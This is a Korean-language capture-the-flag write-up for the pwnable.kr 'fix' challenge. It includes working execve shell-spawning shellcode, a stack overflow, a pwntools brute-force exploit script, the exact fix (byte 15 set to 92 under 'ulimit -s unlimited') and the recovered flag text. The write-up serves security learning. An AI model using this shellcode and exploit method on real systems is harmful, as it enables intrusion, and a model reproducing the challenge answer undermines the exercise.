# [pwnable.kr] fix writeup



#### [summary] stack unlimited, control esp

```shell
Why bother to make your own shellcode?
I can simply copy&paste from shell-storm.org
so I just copied it from shell-storm then used it for my buffer overflow exercise
but it doesn't work :(
can you please help me to fix this??


ssh fix@pwnable.kr -p2222 (pw:guest)
```

ㄱㄱ

```c
#include <stdio.h>

// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void shellcode(){
	// a buffer we are about to exploit!
	char buf[20];

	// prepare shellcode on executable stack!
	strcpy(buf, sc);

	// overwrite return address!
	*(int*)(buf+32) = buf;

	printf("get shell\n");
}

int main(){
    char *a = "asdfasdf"
        printf("What the hell is wrong with my shellcode??????\n");
        printf("I just copied and pasted it from shell-storm.org :(\n");
        printf("Can you fix it for me?\n");

	unsigned int index=0;
	printf("Tell me the byte index to be fixed : ");
	scanf("%d", &index);
	fflush(stdin);

	if(index > 22)	return 0;

	int fix=0;
	printf("Tell me the value to be patched : ");
	scanf("%d", &fix);

	// patching my shellcode
	sc[index] = fix;	

	// this should work..
	shellcode();
	return 0;
}
```

`eip`가 쉘코드로 뛴 다음에 프로그램이 터지는 이유는 stack 공간 상에서 쉘코드가 동작하면서 `push`를 통해 기존 쉘코드의 값에 영향을 주기 때문이다. 쉘코드의 맨 뒷 부분과 `esp` 간에 3*4bytes의 공간밖에 없다.

```shell
gdb-peda$ x/20wx $esp - 24
0xffffcee8:	0x50e3896e	0xb0e18953	0x0080cd0b	0xffffcf08
0xffffcef8:	0xffffcf18	0xffffcedc	0x00000001	0xffffcfc4
```

주어진 쉘코드를 살펴보면 다음과 같다.

```assembly
gdb-peda$ disass /r 0x804a02c
Dump of assembler code for function sc:
   0x0804a02c <+0>:	31 c0	xor    eax,eax
   0x0804a02e <+2>:	50	push   eax
   0x0804a02f <+3>:	68 2f 2f 73 68	push   0x68732f2f
   0x0804a034 <+8>:	68 2f 62 69 6e	push   0x6e69622f
   0x0804a039 <+13>:	89 e3	mov    ebx,esp
   0x0804a03b <+15>:	50	push   eax
   0x0804a03c <+16>:	53	push   ebx
   0x0804a03d <+17>:	89 e1	mov    ecx,esp
   0x0804a03f <+19>:	b0 0b	mov    al,0xb
   0x0804a041 <+21>:	cd 80	int    0x80
   0x0804a043 <+23>:	00 00	add    BYTE PTR [eax],al
```

문제가 의도하는 것은 그럼 저 쉘코드 중 한 바이트를 어떤 값으로 변경하라는 것 같은데, 솔직히 감이 잘 안잡혔다.

그래서 그냥 바로 브루트 포싱을 돌렸다. 23 * 256 = 5888 정도로 충분히 돌려볼 만하다.

### exploit

```python
#!/usr/bin/python
from pwn import *
import sys

#context.log_level = 'debug'
for i in range(0, 23):
	for j in range(0, 0xff+1):
		r = process('./fix')
		#r.interactive()
		#r.recvuntil('Can you fix it for me?\n')	
		
		r.sendline(str(i))
		r.sendline(str(j))
		r.recvuntil('get shell\n')
		print i, j
		try:
			r.sendline('id')
			r.recv(100)	
			r.interactive()
		except:
			print 'sorry..'
			r.close()
			continue

```

바이너리에 버퍼가 할당되어 있어서 싱크가 좀 안맞아서 순서가 좀 이상하긴 한데, 저렇게 하면 돌아가긴 한다.

```shell
ch4rli3kop@ubuntu16:~/pwn/pwnable.kr/fix$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 201
get shell
/bin//sh: 0: Can't open ����
                             P��c

```

sc[15] = 201로 했더니 특별한 반응을 보여서 테스트해보니, 뭔가 실행되는거 같으면서도 안됀다. 아마 인자가 잘못들어간듯. 어셈을 살펴보았더니, 기존 `push eax`를 `leave`로 바꿨다.

```assembly
0xffffcedc:	xor    eax,eax
0xffffcede:	push   eax
0xffffcedf:	push   0x68732f2f
0xffffcee4:	push   0x6e69622f
0xffffcee9:	mov    ebx,esp
0xffffceeb:	leave  
0xffffceec:	push   ebx
0xffffceed:	mov    ecx,esp
0xffffceef:	mov    al,0xb
0xffffcef1:	int    0x80
```

`leave`과정은 `mov esp, ebp; pop ebp`와 동일하기 때문에, 해당 과정을 통해 esp를 이전 프레임으로 옮겨 프로그램을 실행하게 되는데, 에러가 나는 이유를 살펴보니 argv를 구성하는 과정에서 이상한 값이 들어가서 그런 것 같다.

 argv에 ["/bin/sh", NULL]을 만들어야하는데, 기존의 `push eax`를 통해 NULL을 만들었으나 `leave`를 이용하여 뛴 공간에 이상한 값이 들어있어, `/bin/sh`로 해당 인자를 실행시키려하는 과정에서 오류가 발생한 것 같음

어쨋든 `push eax` 대신에 0이 들어있는 곳으로 `esp`를 이동시키면 된다는 것이다.

그런데 모든 값을 다 넣어도 201밖에 응답이 없어서 그걸 이용해서 해보려고, 해당 인자를 어떻게 심볼릭 링크로 연결해서 해보려고도 했는데, 잘 안돼서 결국 힌트를 봤다..

`ulimit -s`을 이용한다고 했는데, 아마 스택 공간을 엄청 크게해서 어디로 `esp`가 가더라도 동작이 제대로 하도록 하는 것 같다. gdb로는 확인할 수가 없어서 정확히 어떻게 하는지는 모르겠다. 나중에 잘하는 사람한테 물어봐야할듯

### result

```shell
fix@prowl:~$ ulimit -s unlimited
fix@prowl:~$ ./fix 
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 92
get shell
$ id
uid=1049(fix) gid=1049(fix) egid=1050 groups=1050,1049(fix)
$ cat flag
Sorry for blaming shell-strom.org :) it was my ignorance!
```

